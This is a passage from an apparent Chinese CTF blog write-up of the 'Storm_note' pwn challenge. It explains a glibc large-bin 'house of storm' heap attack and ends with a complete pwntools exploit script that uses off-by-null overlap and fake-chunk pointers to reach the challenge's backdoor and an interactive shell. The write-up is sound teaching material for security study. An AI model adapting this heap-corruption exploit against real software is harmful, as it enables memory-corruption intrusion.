<p><img src="https://s2.loli.net/2021/12/26/ON9vpwZRDUVMgnj.png" srcset="/img/loading.gif" lazyload></p>
<p>​    那么为什么修改这些值呢，再回顾一下两个解链操作。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><span class="hljs-comment">// 插入</span><br>          &#123;<br>            <span class="hljs-comment">//解链操作，nextsize只有largebin才有</span><br>            victim-&gt;fd_nextsize = fwd;<br>            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>            fwd-&gt;bk_nextsize = victim;<br>            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="hljs-comment">//fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim</span><br>           &#125;<br>          bck = fwd-&gt;bk;<br>      &#125;<br>   &#125;<br> <span class="hljs-keyword">else</span><br>     victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>&#125;<br> mark_bin (av, victim_index);<br><span class="hljs-comment">//解链操作2,fd,bk</span><br> victim-&gt;bk = bck;<br> victim-&gt;fd = fwd;<br> fwd-&gt;bk = victim;<br> bck-&gt;fd = victim;<br><span class="hljs-comment">//fwd-&gt;bk-&gt;fd=victim</span><br></code></pre></td></tr></table></figure>

<p>   这里情况很复杂，需要耐心把每一步链表的操作搞明白，才能理解它的原理。首先victim指的是处在unsorted bin中的堆块，fwd是large bin中的堆块。</p>
<p>  再来回顾一下我们的构造：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">victim-&gt;bk = fake_chunk<br>fwd-&gt;bk = fake_chunk+<span class="hljs-number">8</span><br>fwd-&gt;bk_nextsize=fake_chunk<span class="hljs-number">-0x18</span><span class="hljs-number">-5</span><br></code></pre></td></tr></table></figure>

<p>  通过解链操作1，我们能得到：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">victim-&gt;fd_nextsize=fwd<br>victim-&gt;bk_nextsize=fake_chunk<span class="hljs-number">-0x18</span><span class="hljs-number">-5</span><br>fwd-&gt;bk_nextsize=victim<br>victim-&gt;bk_nextsize-&gt;fd_nextsize=fake_chunk<span class="hljs-number">-0x18</span><span class="hljs-number">-5</span>+<span class="hljs-number">0x20</span>=fake_chunk+<span class="hljs-number">3</span>=victim<br></code></pre></td></tr></table></figure>

<p>  通过解链操作2，我们能得到：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">victim-&gt;bk = bck = fwd-&gt;bk = fake_chunk+ <span class="hljs-number">8</span><br>victim-&gt;fd = largbin_entry<br>fwd-&gt;bk = victim<br>bck-&gt;fd = (fake_chunk +<span class="hljs-number">8</span>)-&gt;fd = victim<br></code></pre></td></tr></table></figure>

<p>  接下来我们可以观察一下调试的结果是否与我们分析的一致。</p>
<p> <img src="https://s2.loli.net/2021/12/26/ekC8BfcU2sgn9VI.png" srcset="/img/loading.gif" lazyload></p>
<p> <img src="D:\blog\source_posts\images\image-20211226162928596-16405140388352.png" srcset="/img/loading.gif" lazyload alt="image-20211226162928596"></p>
<p>  因为fake_chunk-5处会写入victim的地址，开启地址随机化的开头地址是0x55或0x56，所以fake_chunk的size位是0x55或0x56。</p>
<p>  当_int_malloc返回之后会进行如下检查。</p>
<p> <img src="https://s2.loli.net/2021/12/26/Z743qRXiQmeB8TY.png" srcset="/img/loading.gif" lazyload></p>
<p>  其中宏定义如下。</p>
<p> <img src="https://s2.loli.net/2021/12/26/KgAflpt5n1JNHZE.png" srcset="/img/loading.gif" lazyload></p>
<p>  0x55&amp;0x2=0，绕不过检查，所以只有size为0x56时，我们才能申请到0xabcd0100-0x20处的堆块。</p>
<h4 id="4-后门利用"><a href="#4-后门利用" class="headerlink" title="4.后门利用"></a>4.后门利用</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x48</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>edit(<span class="hljs-number">2</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>p.send(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>)<br></code></pre></td></tr></table></figure>

<p>  申请到目标堆块后，将0Xabcd0100处的随机数改为0，触发后门。</p>
<p> <img src="https://s2.loli.net/2021/12/26/H9ju6V8PoMCXhGO.png" srcset="/img/loading.gif" lazyload></p>
<p> <img src="https://s2.loli.net/2021/12/26/Hj3nSoEiYXfrMgw.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./Storm_note&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br> p = process(binary)<br><span class="hljs-keyword">else</span>:<br> p = remote(<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br> p.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br> p.sendlineafter(<span class="hljs-string">&#x27;?\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br> p.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br> p.sendlineafter(<span class="hljs-string">&#x27;?\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br> p.sendafter(<span class="hljs-string">&#x27;\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br> p.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br> p.sendlineafter(<span class="hljs-string">&#x27;?\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br>gdb.attach(p)<br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x508</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#2</span><br><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x508</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#6</span><br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>)) <span class="hljs-comment">#prev_size</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>)) <span class="hljs-comment">#prev_size</span><br><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment">#off by null</span><br><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x4d8</span>) <span class="hljs-comment">#7 </span><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)    <span class="hljs-comment">#overlap</span><br><br><br><span class="hljs-comment">#recover</span><br>add(<span class="hljs-number">0x30</span>)  <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x4e0</span>) <span class="hljs-comment">#2</span><br><br>free(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment">#off by null</span><br>add(<span class="hljs-number">0x18</span>)        <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x4d8</span>)       <span class="hljs-comment">#8 </span><br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)          <span class="hljs-comment">#overlap</span><br>add(<span class="hljs-number">0x40</span>)        <span class="hljs-comment">#4 </span><br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><span class="hljs-comment"># pause()</span><br><br>free(<span class="hljs-number">2</span>)     <span class="hljs-comment">#unsortedbin-&gt; chunk2 -&gt; chunk5(0x4e0)    which size is largebin FIFO</span><br>add(<span class="hljs-number">0x4e8</span>)  <span class="hljs-comment">#put chunk5(0x4e0) to largebin</span><br>free(<span class="hljs-number">2</span>)     <span class="hljs-comment">#put chunk2 to unsortedbin</span><br><br>content_addr = <span class="hljs-number">0xabcd0100</span><br>fake_chunk = content_addr - <span class="hljs-number">0x20</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4f1</span>) <span class="hljs-comment"># size</span><br>payload += p64(<span class="hljs-number">0</span>) + p64(fake_chunk)      <span class="hljs-comment"># bk</span><br>edit(<span class="hljs-number">7</span>, payload)<br><br>payload2 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4e1</span>)  <span class="hljs-comment">#size</span><br>payload2 += p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>)   <br>payload2 += p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0x18</span>-<span class="hljs-number">5</span>)<span class="hljs-comment">#mmap</span><br>edit(<span class="hljs-number">8</span>, payload2)<br><span class="hljs-comment"># pause()</span><br><br>add(<span class="hljs-number">0x48</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>edit(<span class="hljs-number">2</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>p.send(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.wangan.com/docs/pwn-base">https://www.wangan.com/docs/pwn-base</a></p>
<p><a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/">https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/ape5up">https://www.yuque.com/hxfqg9/bin/ape5up</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.8_heap_exploit_3.md">https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.8_heap_exploit_3.md</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/209096.html">https://www.freebuf.com/articles/system/209096.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/176194#h2-3">https://www.anquanke.com/post/id/176194#h2-3</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/213904612">https://zhuanlan.zhihu.com/p/213904612</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/PWN/">PWN</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/how2heap/">how2heap</a>
                    
                      <a class="hover-with-bg" href="/tags/%E5%A0%86/">堆</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/12/26/io-file%E5%B0%8F%E5%8F%99/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">io_file小叙</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/12/26/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
                        <span class="hidden-mobile">堆基础知识</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
